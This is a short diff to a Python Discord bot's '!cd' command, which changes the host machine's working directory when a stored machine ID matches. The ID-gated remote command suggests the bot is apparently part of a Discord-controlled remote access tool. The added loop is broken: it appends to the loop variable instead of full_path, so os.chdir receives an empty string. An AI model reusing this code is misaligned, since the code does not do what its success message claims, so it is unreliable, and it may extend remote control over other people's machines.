@@ -145,10 +145,12 @@ async def cd(context):
     command = context.message.content.replace("!cd ", "")
     word_list = command.split()
     if int(word_list[0]) == int(ID):
-        path = word_list[1]
+        full_path = ""
+        for path in word_list[1:]:
+            path += f"{full_path} "
         try:
-            os.chdir(path)
-            my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
+            os.chdir(full_path)
+            my_embed = discord.Embed(title=f"Succesfully changed directory to: {full_path}", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while changing directory:\n{e}", color=0xFF0000)
